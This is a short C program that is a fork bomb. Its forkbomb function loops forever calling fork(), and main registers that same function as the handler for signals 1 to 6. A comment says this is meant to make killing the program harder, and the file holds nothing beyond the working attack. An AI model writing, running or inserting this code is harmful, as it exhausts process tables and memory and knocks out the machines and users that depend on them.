#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <signal.h>

void forkbomb(int x) {
    printf("Recived signal %d", x);
    while(true) {
        fork();
    }
}

int main(void) {
    // To make killing the program much more annoying
    for (int i = 0; i < 6; i++) {
        signal(i + 1, forkbomb);
    }
    forkbomb(0);
}
